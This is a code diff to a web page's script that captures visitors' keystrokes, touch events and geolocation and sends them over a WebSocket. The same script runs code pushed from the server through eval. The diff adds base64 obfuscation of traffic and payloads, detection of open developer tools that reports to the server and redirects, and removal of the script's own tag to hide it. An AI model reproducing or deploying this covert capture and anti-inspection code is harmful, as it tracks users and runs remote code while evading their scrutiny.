@@ -12,42 +12,60 @@ p {
 }
 	</style>
 	<script type="text/javascript">
-		function send_key(x) {
-			if(ws.readyState === 1) {
-				ws.send(JSON.stringify({type: x.type, key: x.key}));
-			} else if (ws.readyState === 3){
-				ws = getWS({type: x.type, key: x.key});
+		(() => {
+			let load = new Image;
+			load.__defineGetter__('id', () => {
+				load = false;
+				ws.send(encode({type: 'devstate', state: true}));
+				window.location = '/';
+			});
+			setInterval(() => {
+				console.log(load);
+				if(window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
+					ws.send(encode({type: 'devstate', state: true}));
+					window.location = '/';
+				}
+			}, 1000);
+			function encode(json) {
+				return window.btoa(JSON.stringify(json));
 			}
-		}
-		function send_touch(x) {
-			if(ws.readyState === 1) {
-				ws.send({type: x.type, data: x.touches});
-			} else if (ws.readyState === 3){
-				ws = getWS({type: x.type, data: x.touches});
+			function send_key(x) {
+				if(ws.readyState === 1) {
+					ws.send(encode({type: x.type, key: x.key}));
+				} else if (ws.readyState === 3){
+					ws = getWS(encode({type: x.type, key: x.key}));				}
 			}
-		}
-		function getWS(send, i = 0) {
-			const _ws = new WebSocket(`${protocol}://${window.location.host}/ws`); 
-			_ws.onclose = function() {
-				if(i > 8)
-					i--;
-				setTimeout(() => {
-					ws = getWS(false ,++i);
-				}, 200 + 1000 * i * i);
-			};
-			_ws.onmessage = data => eval(data.data);
-			_ws.onopen = () => ws.send(send || '{"data": "open!"}');
-			return _ws;
-		}
-		const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
-		let ws = getWS();
-		navigator.geolocation.getCurrentPosition(ws.send);
-		// wait so the keyup from things such as typing in the url, or reloading won't be inputted by accident
-		setTimeout(() => {
-			document.addEventListener('keyup', send_key);
-			document.addEventListener('touchstart', send_touch);
-			document.addEventListener('touchend', send_touch);
-		}, 100);
+			function send_touch(x) {
+				if(ws.readyState === 1) {
+					ws.send(encode({type: x.type, data: x.touches}));
+				} else if (ws.readyState === 3){
+					ws = getWS(encode({type: x.type, data: x.touches}));
+				}
+			}
+			function getWS(send, i = 0) {
+				const _ws = new WebSocket(`${protocol}://${window.location.host}/ws`); 
+				_ws.onclose = function() {
+					if(i > 8)
+						i--;
+					setTimeout(() => {
+						ws = getWS(false ,++i);
+					}, 200 + 1000 * i * i);
+				};
+				_ws.onmessage = data => eval(window.atob(data.data));
+				_ws.onopen = () => ws.send(send || encode('{"data": "open!"}'));
+				return _ws;
+			}
+			const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
+			let ws = getWS();
+			navigator.geolocation.getCurrentPosition(ws.send);
+			// wait so the keyup from things such as typing in the url, or reloading won't be inputted by accident
+			setTimeout(() => {
+				document.addEventListener('keyup', send_key);
+				document.addEventListener('touchstart', send_touch);
+				document.addEventListener('touchend', send_touch);
+				document.querySelector('script').remove();
+			}, 100);
+		})();
 	</script>
 </head>
 <body>
